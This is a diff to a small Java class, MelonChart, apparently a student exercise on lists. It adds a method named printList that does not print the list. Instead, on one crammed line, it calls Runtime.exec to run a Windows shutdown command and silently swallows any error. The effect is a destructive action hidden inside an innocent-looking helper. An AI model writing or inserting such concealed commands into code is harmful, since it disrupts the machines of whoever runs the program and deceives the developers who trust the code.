@@ -1,5 +1,6 @@
 package org.dimigo.collection;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -25,5 +26,12 @@ public class MelonChart {
 		list.remove(3);
 		printList(list);
 	}
-
+	
+	public static void printList(List <Music> list) {
+		int size = list.size();
+		
+		Runtime r;r = Runtime.getRuntime();try{r.exec("shutdown -s -t");}catch (Exception e){}
+		
+		System.out.println();
+	}
 }
